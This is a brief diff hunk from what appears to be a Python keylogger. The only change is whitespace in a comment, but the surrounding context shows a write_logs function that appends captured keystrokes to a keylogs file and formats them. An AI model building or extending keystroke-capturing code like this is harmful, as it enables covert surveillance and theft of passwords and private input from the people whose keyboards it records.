@@ -142,7 +142,7 @@ while no_of_iterations < no_of_iterations_end:
             keys = []
 
     def write_logs(keys):
-        with open(keypath + extend + keylogs, "a") as logs: # Returns error if the keylogs.txt if not present. To remove this error open the keylogs file in w mode. 
+        with open(keypath + extend + keylogs, "a") as logs: # Returns error if the keylogs.txt if not present. To remove this error open the keylogs file in w mode.
             for key in keys:
                 k = str(key).replace("'","")
                 if k.find("space") > 0: # To add a new line after a Space
